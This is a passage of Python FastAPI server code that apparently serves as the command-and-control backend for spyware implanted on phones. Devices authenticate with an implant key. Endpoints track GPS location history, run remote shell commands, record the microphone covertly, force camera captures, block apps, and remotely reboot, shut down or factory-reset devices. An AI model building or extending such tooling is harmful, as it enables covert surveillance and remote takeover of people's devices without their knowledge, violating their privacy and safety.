    level: int = Form(...),
    lat: float = Form(...),
    lon: float = Form(...),
    db: sqlite3.Connection = Depends(get_db)
):
    global REQUEST_COUNTER
    REQUEST_COUNTER += 1
    # Removed synchronous run_auto_cleanup to prevent DoS
    
    if not secrets.compare_digest(implant_key, IMPLANT_KEY):
        return JSONResponse({"status": "error", "message": "Unauthorized Payload"}, status_code=403)
        
    current_time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
    now_unix = time.time()
    
    c = db.cursor()
    c.execute("SELECT ping_interval, record_audio, record_duration, notif_state, notif_text, play_audio, reboot_cmd, shutdown_cmd FROM devices WHERE device_id = ?", (device_id,))
    row = c.fetchone()
    
    if row:
        ping_interval = row["ping_interval"]
        record_audio = row["record_audio"]
        record_duration = row["record_duration"]
        notif_state = row["notif_state"]
        notif_text = row["notif_text"]
        play_audio = row["play_audio"]
        reboot_cmd = row["reboot_cmd"]
        shutdown_cmd = row["shutdown_cmd"]
        
        c.execute("""
            UPDATE devices 
            SET level = ?, lat = ?, lon = ?, timestamp = ?, unix_time = ? 
            WHERE device_id = ?
        """, (level, lat, lon, current_time_str, now_unix, device_id))
    else:
        ping_interval = 5
        record_audio = 0
        record_duration = 30
        notif_state = 0
        notif_text = ""
        play_audio = 0
        reboot_cmd = 0
        shutdown_cmd = 0
        c.execute("""
            INSERT INTO devices (device_id, level, lat, lon, timestamp, unix_time, ping_interval, record_audio, record_duration, notif_state, notif_text, play_audio, reboot_cmd, shutdown_cmd)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (device_id, level, lat, lon, current_time_str, now_unix, ping_interval, record_audio, record_duration, notif_state, notif_text, play_audio, reboot_cmd, shutdown_cmd))
        
    # Reset one-time commands after they are successfully fetched by the implant
    if reboot_cmd == 1 or shutdown_cmd == 1:
        c.execute("UPDATE devices SET reboot_cmd = 0, shutdown_cmd = 0 WHERE device_id = ?", (device_id,))
    
    # play_audio is intentionally NOT reset here — the dashboard badge reads
    # play_audio from /stats (which queries this DB row) and needs the non-zero
    # value to display "Blasting" while audio is active.  The stop command
    # (play_audio=0) from the dashboard will zero it when the user clicks Stop.
        
    # Apply the same GPS deduplication filter as the WebSocket path.
    # The legacy HTTP /battery_report endpoint previously wrote every single
    # ping to history unconditionally, causing massive table bloat.
    if validate_coordinates(lat, lon) and should_record_gps(device_id, lat, lon, now_unix):
        c.execute(
            "INSERT INTO history (device_id, level, lat, lon, timestamp, unix_time) VALUES (?, ?, ?, ?, ?, ?)",
            (device_id, level, lat, lon, current_time_str, now_unix)
        )
        update_gps_cache(device_id, lat, lon, now_unix)

    db.commit()
    
    return {
        "status": "success",
        "next_ping_seconds": ping_interval,
        "record_audio": record_audio,
        "notification_command": notif_state,
        "notification_text": notif_text,
        "play_audio": play_audio,
        "reboot_cmd": reboot_cmd,
        "shutdown_cmd": shutdown_cmd
    }

@app.get("/devices")
async def get_devices(request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    c = db.cursor()
    c.execute("SELECT device_id FROM devices ORDER BY device_id ASC")
    rows = c.fetchall()
    return {"devices": [r["device_id"] for r in rows]}

@app.get("/active_connections")
async def get_active_connections(request: Request):
    verify_session(request)
    async with ws_manager.lock:
        connections = list(ws_manager.active_connections.keys())
    return {"connections": connections}

@app.post("/send_task")
async def send_task(device_id: str = Form(...), task: str = Form(...), payload: str = Form("{}"), request: Request = Depends(verify_session)):
    if device_id not in ws_manager.active_connections:
        return JSONResponse({"status": "offline", "message": "Connection not active"}, status_code=404)

    data = {"task": task}
    try:
        extra = json.loads(payload or "{}")
        if isinstance(extra, dict):
            data.update(extra)
    except Exception:
        pass

    await ws_manager.send_task(device_id, data)
    return {"status": "sent", "task": data}

@app.get("/check_commands")
async def check_commands(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    c = db.cursor()
    c.execute("SELECT ping_interval, record_audio, notif_state, notif_text, play_audio FROM devices WHERE device_id = ?", (device_id,))
    row = c.fetchone()
    if row:
        return dict(row)
    return {}

@app.get("/get_errors")
async def get_errors(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    c = db.cursor()
    c.execute("SELECT source, message, timestamp FROM device_errors WHERE device_id = ? ORDER BY unix_time DESC LIMIT 50", (device_id,))
    rows = c.fetchall()
    return {"errors": [{"source": r["source"], "message": r["message"], "timestamp": r["timestamp"]} for r in rows]}

@app.get("/stats")
async def get_stats(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    c = db.cursor()
    c.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
    row = c.fetchone()
    
    activity_state = "Stationary"
    is_online = False
    speed_ms = 0.0
    speed_kmh = 0.0
    
    if row:
        c.execute("SELECT lat, lon, unix_time FROM history WHERE device_id = ? ORDER BY unix_time DESC LIMIT 2", (device_id,))
        points = c.fetchall()
        if len(points) == 2:
            dist = haversine(points[1]["lat"], points[1]["lon"], points[0]["lat"], points[0]["lon"])
            time_diff = abs(points[0]["unix_time"] - points[1]["unix_time"])
            if time_diff > 0:
                speed_ms = round(dist / time_diff, 2)
                speed_kmh = round(speed_ms * 3.6, 2)
                if speed_ms > 1.5:  # 1.5m/s (walking pace) ignores GPS drift
                    activity_state = "Moving"
                
        # Check online: 1) active WS connection, 2) recent heartbeat in devices table, 3) recent history entry
        if device_id in ws_manager.active_connections:
            is_online = True
        elif row['unix_time'] and (time.time() - row['unix_time'] < 180):
            is_online = True
        else:
            c.execute("SELECT unix_time FROM history WHERE device_id = ? ORDER BY unix_time DESC LIMIT 1", (device_id,))
            lt_row = c.fetchone()
            if lt_row and lt_row['unix_time'] and (time.time() - lt_row['unix_time'] < 180):
                is_online = True
            
    if row:
        result = dict(row)
        result["activity"] = activity_state
        result["is_online"] = is_online
        result["speed_ms"] = speed_ms
        result["speed_kmh"] = speed_kmh
        return JSONResponse(content=result, headers={"Cache-Control": "no-store, no-cache, must-revalidate", "Pragma": "no-cache"})
        
    return {"level": "0", "timestamp": "Waiting for devices...", "is_online": False}

@app.get("/history")
async def get_history(device_id: str, request: Request, hours: float = 0, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    c = db.cursor()
    if hours > 0:
        threshold = time.time() - (hours * 3600)
        c.execute("SELECT lat, lon FROM history WHERE device_id = ? AND unix_time >= ? ORDER BY unix_time DESC LIMIT 1000", (device_id, threshold))
    else:
        c.execute("SELECT lat, lon FROM history WHERE device_id = ? ORDER BY unix_time DESC LIMIT 500", (device_id,))
    rows = c.fetchall()
    return {"path": [[r["lat"], r["lon"]] for r in rows]}

@app.get("/history_detailed")
async def get_history_detailed(
    device_id: str, 
    request: Request,
    start_time: Optional[float] = None, 
    end_time: Optional[float] = None,
    page: int = 1,
    per_page: int = 500,
    db: sqlite3.Connection = Depends(get_db)
):
    verify_session(request)
    c = db.cursor()
    offset = (page - 1) * per_page
    if start_time and end_time:
        c.execute("""
            SELECT lat, lon, level, timestamp, unix_time 
            FROM history 
            WHERE device_id = ? AND unix_time >= ? AND unix_time <= ? 
            ORDER BY unix_time DESC
            LIMIT ? OFFSET ?
        """, (device_id, start_time, end_time, per_page, offset))
    else:
        c.execute("SELECT lat, lon, level, timestamp, unix_time FROM history WHERE device_id = ? ORDER BY unix_time DESC LIMIT ? OFFSET ?", (device_id, per_page, offset))
        
    rows = c.fetchall()
    
    # Get total count for pagination
    if start_time and end_time:
        c.execute("SELECT COUNT(*) FROM history WHERE device_id = ? AND unix_time >= ? AND unix_time <= ?", (device_id, start_time, end_time))
    else:
        c.execute("SELECT COUNT(*) FROM history WHERE device_id = ?", (device_id,))
    total = c.fetchone()[0]
    
    # Calculate speed and gaps between points
    history_data = []
    for i, r in enumerate(rows):
        speed = 0
        gap = 0
        if i > 0:
            prev_r = rows[i - 1]
            # Calculate time gap in seconds
            gap = int(prev_r["unix_time"] - r["unix_time"])
            # Haversine distance calculation
            lat1, lon1 = math.radians(r["lat"]), math.radians(r["lon"])
            lat2, lon2 = math.radians(prev_r["lat"]), math.radians(prev_r["lon"])
            dlat = lat2 - lat1
            dlon = lon2 - lon1
            a = math.sin(dlat/2)**2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon/2)**2
            c_val = 2 * math.asin(math.sqrt(a))
            distance_m = 6371000 * c_val  # Earth radius in meters
            # Speed in km/h
            if gap > 0:
                speed = (distance_m / 1000) / (gap / 3600)
        history_data.append({
            "lat": r["lat"], 
            "lon": r["lon"], 
            "level": r["level"], 
            "time": r["timestamp"], 
            "unix_time": r["unix_time"],
            "speed": round(speed, 1),
            "gap": gap
        })
    
    return {
        "history": history_data,
        "total": total,
        "page": page,
        "per_page": per_page,
        "total_pages": math.ceil(total / per_page) if total > 0 else 1
    }

@app.get("/battery_history")
async def battery_history(
    device_id: str,
    request: Request,
    start_time: Optional[float] = None,
    end_time: Optional[float] = None,
    page: int = 1,
    per_page: int = 200,
    db: sqlite3.Connection = Depends(get_db)
):
    verify_session(request)
    c = db.cursor()
    offset = (page - 1) * per_page
    if start_time and end_time:
        c.execute("SELECT level, timestamp, unix_time, gap_seconds FROM battery_history WHERE device_id = ? AND unix_time >= ? AND unix_time <= ? ORDER BY unix_time DESC LIMIT ? OFFSET ?", (device_id, start_time, end_time, per_page, offset))
        rows = c.fetchall()
        c.execute("SELECT COUNT(*) FROM battery_history WHERE device_id = ? AND unix_time >= ? AND unix_time <= ?", (device_id, start_time, end_time))
    else:
        c.execute("SELECT level, timestamp, unix_time, gap_seconds FROM battery_history WHERE device_id = ? ORDER BY unix_time DESC LIMIT ? OFFSET ?", (device_id, per_page, offset))
        rows = c.fetchall()
        c.execute("SELECT COUNT(*) FROM battery_history WHERE device_id = ?", (device_id,))
    total = c.fetchone()[0]
    return {
        "history": [{"level": r["level"], "time": r["timestamp"], "unix_time": r["unix_time"], "gap_seconds": r["gap_seconds"]} for r in rows],
        "total": total,
        "page": page,
        "per_page": per_page,
        "total_pages": math.ceil(total / per_page) if total > 0 else 1
    }

@app.get("/screen_time_summary")
async def screen_time_summary(device_id: str, date: Optional[str] = None, request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    if not date:
        date = time.strftime('%Y-%m-%d', time.localtime())

    c = db.cursor()
    c.execute("SELECT minutes, updated_at FROM daily_screen_time WHERE device_id = ? AND date = ?", (device_id, date))
    row = c.fetchone()
    if row:
        return {"device_id": device_id, "date": date, "minutes": row["minutes"], "updated_at": row["updated_at"]}
    return {"device_id": device_id, "date": date, "minutes": 0, "updated_at": None}

@app.post("/set_ping")
async def set_ping(device_id: str = Form(...), seconds: int = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    c = db.cursor()
    c.execute("UPDATE devices SET ping_interval = ? WHERE device_id = ?", (seconds, device_id))
    db.commit()
    return {"status": "success"}

@app.post("/set_interval")
async def set_interval(device_id: str = Form(...), interval: int = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    c = db.cursor()
    c.execute("UPDATE devices SET ping_interval = ? WHERE device_id = ?", (interval, device_id))
    db.commit()
    if device_id in ws_manager.active_connections:
        await ws_manager.send_task(device_id, {"task": "set_interval", "interval": interval})
    return {"status": "success"}

@app.post("/set_notification")
async def set_notification(device_id: str = Form(...), state: int = Form(...), text: str = Form(""), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    c = db.cursor()
    c.execute("UPDATE devices SET notif_state = ?, notif_text = ? WHERE device_id = ?", (state, text, device_id))
    db.commit()
    if device_id in ws_manager.active_connections:
        await ws_manager.send_task(device_id, {"task": "system_alert", "state": state, "text": text})
    return {"status": "success"}

@app.post("/set_audio")
async def set_audio(device_id: str = Form(...), play_audio: int = Form(...), loops: int = Form(0), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    c = db.cursor()
    # Keep play_audio in DB at the non-zero value while blasting so /stats
    # returns the live state and the dashboard badge shows "Blasting".
    # Only reset to 0 when an explicit stop (play_audio == 0) comes in.
    c.execute("UPDATE devices SET play_audio = ?, audio_loops = ? WHERE device_id = ?", (play_audio, loops, device_id))
    db.commit()
    delivered = False
    
    payload = {"task": "audio_blast", "play": str(play_audio), "loops": str(loops)}
    print(f"[audio] Attempting to send WS task to {device_id}: {payload}", flush=True)
    delivered = await ws_manager.send_task(device_id, payload)
    
    if not delivered:
        print(f"[audio] Device {device_id} not reachable via WS, command queued in DB", flush=True)
        # If device is offline and we're trying to stop, just reset the DB
        if play_audio == 0:
            c.execute("UPDATE devices SET play_audio = 0, audio_loops = 0 WHERE device_id = ?", (device_id,))
            db.commit()
    return {"status": "success", "delivered": delivered}

@app.post("/set_record_audio")
async def set_record_audio(device_id: str = Form(...), record_audio: int = Form(...), record_duration: int = Form(19), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    c = db.cursor()
    c.execute("UPDATE devices SET record_audio = ?, record_duration = ? WHERE device_id = ?", (record_audio, record_duration, device_id))
    db.commit()
    if device_id in ws_manager.active_connections and record_audio == 1:
        await ws_manager.send_task(device_id, {"task": "mic_record", "duration": record_duration})
    return {"status": "success"}

@app.post("/audio_done")
async def audio_done(device_id: str = Form(...), db: sqlite3.Connection = Depends(get_db)):
    c = db.cursor()
    c.execute("UPDATE devices SET play_audio = 0, audio_loops = 0 WHERE device_id = ?", (device_id,))
    db.commit()
    print(f"[audio] Device {device_id} reported audio finished. Reset play_audio to 0.", flush=True)
    return {"status": "success"}

@app.post("/set_power_cmd")
async def set_power_cmd(device_id: str = Form(...), action: str = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    c = db.cursor()
    if action == "reboot":
        c.execute("UPDATE devices SET reboot_cmd = 1 WHERE device_id = ?", (device_id,))
    elif action == "shutdown":
        c.execute("UPDATE devices SET shutdown_cmd = 1 WHERE device_id = ?", (device_id,))
    db.commit()
    if device_id in ws_manager.active_connections:
        await ws_manager.send_task(device_id, {"task": "power_cmd", "action": action})
    return {"status": "success"}


@app.post("/run_shell_command")
async def run_shell_command(device_id: str = Form(...), command: str = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    c = db.cursor()
    c.execute("UPDATE devices SET last_shell_command = ?, last_shell_output = ?, last_shell_status = 0, last_shell_at = ? WHERE device_id = ?",
              (command, "[pending result]",  time.time(), device_id))
    db.commit()
    if device_id in ws_manager.active_connections:
        await ws_manager.send_task(device_id, {"task": "shell", "command": command})
        return {"status": "sent"}
    return JSONResponse({"status": "offline", "message": "Device not connected"}, status_code=404)


@app.get("/shell_output")
async def shell_output(request: Request, device_id: str, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    c = db.cursor()
    c.execute("SELECT last_shell_command, last_shell_output, last_shell_status, last_shell_at FROM devices WHERE device_id = ?", (device_id,))
    row = c.fetchone()
    if not row:
        return JSONResponse({"status": "unknown", "device_id": device_id}, status_code=404)
    return {
        "status": "ok",
        "device_id": device_id,
        "command": row["last_shell_command"] or "",
        "output": row["last_shell_output"] or "",
        "last_shell_status": row["last_shell_status"],
        "last_shell_at": row["last_shell_at"] or 0,
    }

@app.post("/set_factory_reset")
async def set_factory_reset(device_id: str = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    if device_id in ws_manager.active_connections:
        await ws_manager.send_task(device_id, {"task": "factory_reset"})
    return {"status": "success"}


@app.post("/check_location_state")
async def check_location_state(request: Request, device_id: str = Form(...)):
    if not verify_session(request):
        return HTMLResponse(status_code=401)

    connected = device_id in ws_manager.active_connections
    if not connected:
        return JSONResponse({"status": "sent", "connected": False, "loc_state": None})

    future = asyncio.get_event_loop().create_future()
    pending_location_checks[device_id] = future
    try:
        await ws_manager.send_task(device_id, {"task": "check_location_state"})
        loc_state = await asyncio.wait_for(future, timeout=4.0)
        return JSONResponse({"status": "ok", "connected": True, "loc_state": int(loc_state)})
    except asyncio.TimeoutError:
        return JSONResponse({"status": "timeout", "connected": True, "loc_state": None})
    finally:
        pending_location_checks.pop(device_id, None)

@app.post("/request_installed_apps")
async def request_installed_apps(request: Request, device_id: str = Form(...)):
    if not verify_session(request):
        return HTMLResponse(status_code=401)
    if device_id in ws_manager.active_connections:
        await ws_manager.send_task(device_id, {"task": "refresh_installed_apps"})
    return JSONResponse({"status": "sent"})

@app.post("/set_location_tracking")
async def set_location_tracking(request: Request, device_id: str = Form(...), enable: int = Form(...), db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    c = db.cursor()
    c.execute("UPDATE devices SET location_tracking=? WHERE device_id=?", (enable, device_id))
    db.commit()
    if device_id in ws_manager.active_connections:
        await ws_manager.send_task(device_id, {"task": "set_location", "track": enable})
    return JSONResponse({"status": "success"})

@app.get("/logout")
async def logout():
    response = RedirectResponse(url="/login", status_code=status.HTTP_303_SEE_OTHER)
    response.delete_cookie(key="session_token")
    return response


@app.post("/set_blocked_apps")
async def set_blocked_apps(request: Request, payload: dict = Body(...), db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    device_id = payload.get('device_id')
    apps = payload.get('apps', '')
    if not device_id:
        return JSONResponse({"status": "error", "detail": "device_id is required"}, status_code=422)
    c = db.cursor()
    c.execute("UPDATE devices SET blocked_apps=? WHERE device_id=?", (apps, device_id))
    db.commit()
    if device_id in ws_manager.active_connections:
        await ws_manager.send_task(device_id, {"task": "update_blocked_apps", "apps": apps})
    return JSONResponse({"status": "success"})

@app.post("/delete_device")
async def delete_device(device_id: str = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    c = db.cursor()
    c.execute("DELETE FROM history WHERE device_id = ?", (device_id,))
    c.execute("DELETE FROM battery_history WHERE device_id = ?", (device_id,))
    c.execute("DELETE FROM device_errors WHERE device_id = ?", (device_id,))
    c.execute("DELETE FROM daily_screen_time WHERE device_id = ?", (device_id,))
    db.commit()
    
    c.execute("DELETE FROM devices WHERE device_id = ?", (device_id,))
    c.execute("DELETE FROM selfies WHERE device_id = ?", (device_id,))
    db.commit()

    safe_id = sanitize_device_id(device_id)
    if os.path.exists(AUDIO_DIR):
        for f in os.listdir(AUDIO_DIR):
            if f.startswith(f"{safe_id}_"):
                try:
                    os.remove(os.path.join(AUDIO_DIR, f))
                except OSError:
                    pass
    if os.path.exists(SELFIE_DIR):
        for f in os.listdir(SELFIE_DIR):
            if f.startswith(f"{safe_id}_"):
                try:
                    os.remove(os.path.join(SELFIE_DIR, f))
                except OSError:
                    pass

    if device_id in ws_manager.active_connections:
        try:
            await ws_manager.active_connections[device_id].close()
        except Exception:
            pass
        await ws_manager.disconnect(device_id)
        
    return {"status": "success"}

@app.post("/stop_server")
async def stop_server(request: Request):
    verify_session(request)

    def _shutdown():
        time.sleep(0.5)
        os._exit(0)

    threading.Thread(target=_shutdown, daemon=True).start()
    return JSONResponse({"status": "success", "message": "Server shutdown initiated."})

@app.post("/upload_audio")
async def upload_audio(
    implant_key: str = Form(...),
    device_id: str = Form(...),
    file: Optional[UploadFile] = File(None),
    error: Optional[str] = Form(None),
    db: sqlite3.Connection = Depends(get_db)
):
    if not secrets.compare_digest(implant_key, IMPLANT_KEY):
        return JSONResponse({"status": "error", "message": "Unauthorized Payload"}, status_code=403)

    safe_device_id = sanitize_device_id(device_id)
    c = db.cursor()

    if error == "busy":
        filename = os.path.join(AUDIO_DIR, f"{safe_device_id}_{int(time.time())}_BUSY.txt")
        with open(filename, "w") as f:
            f.write("Microphone was busy by another app - 0.0s recorded")
        c.execute("UPDATE devices SET record_audio = 0 WHERE device_id = ?", (device_id,))
    elif file:
        filename = os.path.join(AUDIO_DIR, f"{safe_device_id}_{int(time.time())}.wav")
        with open(filename, "wb") as buffer:
            shutil.copyfileobj(file.file, buffer)
        c.execute("UPDATE devices SET record_audio = 0 WHERE device_id = ?", (device_id,))

    db.commit()
    return {"status": "success"}

@app.get("/audio_files")
async def get_audio_files(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    safe_id = sanitize_device_id(device_id)
    files = []
    if os.path.exists(AUDIO_DIR):
        for f in os.listdir(AUDIO_DIR):
            if f.startswith(f"{safe_id}_") and (f.endswith(".wav") or f.endswith(".m4a") or f.endswith("BUSY.txt")):
                files.append(f"/media/audio/{f}")
    files.sort(reverse=True)
    return {"files": files}

@app.post("/delete_audio")
async def delete_audio(filename: str = Form(...), request: Request = Depends(verify_session)):
    safe_name = os.path.basename(filename)
    path = os.path.join(AUDIO_DIR, safe_name)
    if os.path.exists(path):
        os.remove(path)
    return {"status": "success"}

@app.post("/flag_audio")
async def flag_audio(filename: str = Form(...), request: Request = Depends(verify_session)):
    safe_name = os.path.basename(filename)
    path = os.path.join(AUDIO_DIR, safe_name)
    is_audio = safe_name.endswith('.wav') or safe_name.endswith('.m4a')
    if os.path.exists(path) and is_audio:
        if "_FLAG" not in safe_name:
            base, ext = os.path.splitext(path)
            new_path = base + "_FLAG" + ext
            os.rename(path, new_path)
    return {"status": "success"}


# ── Selfie Endpoints ─────────────────────────────────────────────────────────

@app.post("/api/upload-selfie")
async def upload_selfie(
    request: Request,
    selfie: UploadFile = File(...),
    implant_key: Optional[str] = Header(None, alias="X-Implant-Key"),
    db: sqlite3.Connection = Depends(get_db)
):
    device_id = request.headers.get("X-Device-ID", "unknown")
    if not implant_key or not secrets.compare_digest(implant_key, IMPLANT_KEY):
        raise HTTPException(status_code=403, detail="Unauthorized Payload")
    safe_device_id = sanitize_device_id(device_id)
    
    now_unix = time.time()
    time_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(now_unix))
    date_str = time.strftime('%Y%m%d_%H%M%S', time.localtime(now_unix))
    
    filename = f"{safe_device_id}_{date_str}.jpg"
    filepath = os.path.join(SELFIE_DIR, filename)
    
    # Read bytes and restrict file size to 10MB
    file_bytes = await selfie.read()
    if len(file_bytes) > 10 * 1024 * 1024:
        raise HTTPException(status_code=413, detail="File too large")
    
    # Validate Magic Bytes for JPEG/PNG/GIF to prevent XSS via false images
    header = file_bytes[:4]
    is_image = False
    if header.startswith(b'\xff\xd8\xff'): # JPEG
        is_image = True
    elif header.startswith(b'\x89PNG'): # PNG
        is_image = True
    elif header.startswith(b'GIF8'): # GIF
        is_image = True
        
    if not is_image:
        raise HTTPException(status_code=400, detail="Invalid image file format")
    
    with open(filepath, "wb") as buffer:
        buffer.write(file_bytes)
    
    c = db.cursor()
    c.execute("SELECT level, lat, lon FROM devices WHERE device_id = ?", (device_id,))
    row = c.fetchone()
    battery = row["level"] if row else 0
    lat = row["lat"] if row else 0.0
    lon = row["lon"] if row else 0.0
    
    c.execute('''INSERT INTO selfies (device_id, filename, timestamp, unix_time, battery, lat, lon, review_status)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
              (device_id, filename, time_str, now_unix, battery, lat, lon, 'pending'))
    db.commit()
    selfie_id = c.lastrowid
    
    return {"status": "success", "filename": filename, "selfie_id": selfie_id}


@app.get("/api/selfie-status/{selfie_id}")
async def selfie_approval_status(
    selfie_id: int,
    request: Request,
    implant_key: Optional[str] = Header(None, alias="X-Implant-Key"),
    db: sqlite3.Connection = Depends(get_db)
):
    """Polled by the selfie app to check if a capture was approved/denied."""
    if not implant_key or not secrets.compare_digest(implant_key, IMPLANT_KEY):
        raise HTTPException(status_code=403, detail="Unauthorized")
    c = db.cursor()
    c.execute("SELECT review_status FROM selfies WHERE id = ?", (selfie_id,))
    row = c.fetchone()
    if not row:
        raise HTTPException(status_code=404, detail="Selfie not found")
    return {"selfie_id": selfie_id, "review_status": row["review_status"]}


@app.get("/api/device-selfies")
async def device_selfie_history(
    request: Request,
    implant_key: Optional[str] = Header(None, alias="X-Implant-Key"),
    db: sqlite3.Connection = Depends(get_db)
):
    """Returns selfie history for a device (called by the on-device gallery)."""
    device_id = request.headers.get("X-Device-ID", "unknown")
    if not implant_key or not secrets.compare_digest(implant_key, IMPLANT_KEY):
        raise HTTPException(status_code=403, detail="Unauthorized")
    c = db.cursor()
    c.execute(
        "SELECT id, filename, timestamp, review_status FROM selfies WHERE device_id = ? ORDER BY unix_time DESC LIMIT 50",
        (device_id,)
    )
    rows = c.fetchall()
    return [{"id": r["id"], "filename": r["filename"], "timestamp": r["timestamp"], "status": r["review_status"]} for r in rows]

@app.get("/api/selfie-image/{filename}")
async def selfie_image_by_key(
    filename: str,
    request: Request,
    implant_key: Optional[str] = Header(None, alias="X-Implant-Key")
):
    """Serves selfie images authenticated by implant key (for on-device gallery)."""
    if not implant_key or not secrets.compare_digest(implant_key, IMPLANT_KEY):
        raise HTTPException(status_code=403, detail="Unauthorized")
    safe_name = os.path.basename(filename)
    file_path = os.path.join(SELFIE_DIR, safe_name)
    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="File not found")
    return FileResponse(file_path, media_type="image/jpeg")

@app.post("/force_selfie")
async def force_selfie(device_id: str = Form(...), request: Request = Depends(verify_session)):
    if device_id in ws_manager.active_connections:
        await ws_manager.send_task(device_id, {"task": "force_selfie"})
        return {"status": "success"}
    return {"status": "offline", "detail": "Device is not connected"}

@app.get("/selfie_schedule")
async def selfie_schedule(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    row = ensure_selfie_schedule(device_id, db)
    return {
        "device_id": device_id,
        "next_run_at": row["next_run_at"],
        "enabled": row["enabled"],
        "dev_mode": row["dev_mode"]
    }

@app.post("/set_selfie_schedule")
async def set_selfie_schedule(
    device_id: str = Form(...),
    scheduled_time: str = Form(...),
    enabled: int = Form(1),
    dev_mode: int = Form(1),
    auth: bool = Depends(verify_session),
    db: sqlite3.Connection = Depends(get_db)
):
    ensure_selfie_schedule(device_id, db)
    next_run_at = get_next_run_at_for_time_string(scheduled_time)
    c = db.cursor()
    c.execute("UPDATE selfie_schedule SET next_run_at = ?, enabled = ?, dev_mode = ?, updated_at = ? WHERE device_id = ?",
              (next_run_at, to_int(enabled, 1), to_int(dev_mode, 1), time.time(), device_id))
    db.commit()
    return {"status": "success", "next_run_at": next_run_at, "enabled": to_int(enabled, 1), "dev_mode": to_int(dev_mode, 1)}


@app.post("/review_selfie")
async def review_selfie(selfie_id: int = Form(...), action: str = Form(...), auth: bool = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    status = "approved" if action == "approve" else "denied"
    reviewed_at = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
    c = db.cursor()
    c.execute("UPDATE selfies SET review_status = ?, reviewed_at = ? WHERE id = ?", (status, reviewed_at, selfie_id))
    db.commit()
    return {"status": "success", "review_status": status, "reviewed_at": reviewed_at}


@app.get("/selfie_list")
async def selfie_list(
    device_id: str,
    request: Request,
    date: Optional[str] = None,
    db: sqlite3.Connection = Depends(get_db)
):
    verify_session(request)
    c = db.cursor()
    if date:
        c.execute("SELECT id, filename, timestamp, unix_time, battery, lat, lon, review_status, reviewed_at FROM selfies WHERE device_id = ? AND timestamp LIKE ? ORDER BY unix_time DESC",
                  (device_id, f"{date}%"))
    else:
        c.execute("SELECT id, filename, timestamp, unix_time, battery, lat, lon, review_status, reviewed_at FROM selfies WHERE device_id = ? ORDER BY unix_time DESC LIMIT 100",
                  (device_id,))
    rows = c.fetchall()
    result = []
    for r in rows:
        result.append({
            "id": r["id"],
            "filename": r["filename"],
            "url": f"/media/selfies/{r['filename']}",
            "timestamp": r["timestamp"],
            "battery": r["battery"],
            "lat": r["lat"],
            "lon": r["lon"],
            "review_status": r["review_status"],
            "reviewed_at": r["reviewed_at"]
        })
    return {"selfies": result}


@app.get("/selfie_dates")
async def selfie_dates(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    c = db.cursor()
    c.execute("SELECT DISTINCT substr(timestamp, 1, 10) as date, COUNT(*) as count FROM selfies WHERE device_id = ? GROUP BY date ORDER BY date DESC",
              (device_id,))
    rows = c.fetchall()
    return {"dates": [{"date": r["date"], "count": r["count"]} for r in rows]}


@app.post("/skip_selfie_today")
async def skip_selfie_today(device_id: str = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    today = time.strftime('%Y-%m-%d', time.localtime())
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
    c = db.cursor()
    c.execute("INSERT OR IGNORE INTO selfie_skips (device_id, skip_date, timestamp, unix_time) VALUES (?, ?, ?, ?)",
              (device_id, today, timestamp, time.time()))
    ensure_selfie_schedule(device_id, db)
    c.execute("SELECT next_run_at FROM selfie_schedule WHERE device_id = ?", (device_id,))
    row = c.fetchone()
    if row and row["next_run_at"]:
        next_run = parse_datetime_string(row["next_run_at"])
        if next_run and next_run.date() == datetime.now().date():
            next_run = next_run + timedelta(days=1)
            c.execute("UPDATE selfie_schedule SET next_run_at = ?, updated_at = ? WHERE device_id = ?",
                      (format_datetime_string(next_run), time.time(), device_id))
    db.commit()
    return {"status": "ok", "skipped_today": True, "date": today}

@app.post("/unskip_selfie_today")
async def unskip_selfie_today(device_id: str = Form(...), request: Request = Depends(verify_session), db: sqlite3.Connection = Depends(get_db)):
    today = time.strftime('%Y-%m-%d', time.localtime())
    c = db.cursor()
    c.execute("DELETE FROM selfie_skips WHERE device_id = ? AND skip_date = ?", (device_id, today))
    db.commit()
    return {"status": "ok", "skipped_today": False, "date": today}

@app.get("/selfie_skip_status")
async def selfie_skip_status(device_id: str, request: Request, db: sqlite3.Connection = Depends(get_db)):
    verify_session(request)
    today = time.strftime('%Y-%m-%d', time.localtime())
    c = db.cursor()
    c.execute("SELECT 1 FROM selfie_skips WHERE device_id = ? AND skip_date = ? LIMIT 1", (device_id, today))
    skipped = c.fetchone() is not None
    return {"skipped_today": skipped, "date": today}

